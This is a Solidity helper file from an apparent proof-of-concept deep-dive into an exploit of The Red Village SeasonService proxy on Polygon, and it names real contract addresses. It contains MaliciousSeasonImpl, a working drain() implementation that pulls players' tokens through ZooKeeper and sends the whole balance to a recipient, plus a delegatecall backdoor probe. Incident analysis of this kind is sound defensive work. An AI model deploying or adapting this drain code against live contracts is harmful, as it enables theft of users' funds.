// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Helper contracts for the The Red Village (Polygon) deep-dive PoC.
//
// These mirror the *shape* of the real attacker's minimal implementation that is STILL the
// active implementation of the SeasonService UUPS proxy (0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77,
// impl 0xa3822cdf2bb59cefc7e70fa5d693b7e9fbc50afa since the 2026-09-21 exploit). The real impl's
// upgradeTo/delegatecall gates use tx.origin == hardcoded attacker EOA, which the tests verify
// separately via eth_call-equivalent behavior on the fork.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
}

interface IZooKeeperMin {
    function transferERC20In(address _currency, address _from, uint256 _amount) external;
    function transferERC20Out(address _currency, address _to, uint256 _amount) external;
}

// Minimal UUPS-compatible malicious implementation. When installed on the SeasonService proxy,
// drain() runs in the proxy's context, so every ZooKeeper call carries msg.sender == SeasonService
// proxy -- exactly the address the ZooKeeper's onlyRoler("transferERC20In"/"transferERC20Out")
// checks against the AccessControl.
contract MaliciousSeasonImpl {
    bytes32 internal constant IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function proxiableUUID() external pure returns (bytes32) {
        return IMPL_SLOT;
    }

    function drain(
        address token,
        address zk,
        address recipient,
        address[] calldata players,
        uint256[] calldata amounts
    ) external {
        for (uint256 i = 0; i < players.length; i++) {
            IZooKeeperMin(zk).transferERC20In(token, players[i], amounts[i]);
        }
        IZooKeeperMin(zk).transferERC20Out(token, recipient, IERC20Min(token).balanceOf(zk));
    }
}

// Helper used to prove the attacker's `delegatecall(address,bytes)` backdoor on the proxy:
// delegatecalled from the SeasonService proxy, marker() runs in the proxy's context.
contract DcHelper {
    function marker() external pure returns (bytes32) {
        return keccak256("trv-delegatecall-backdoor");
    }
}
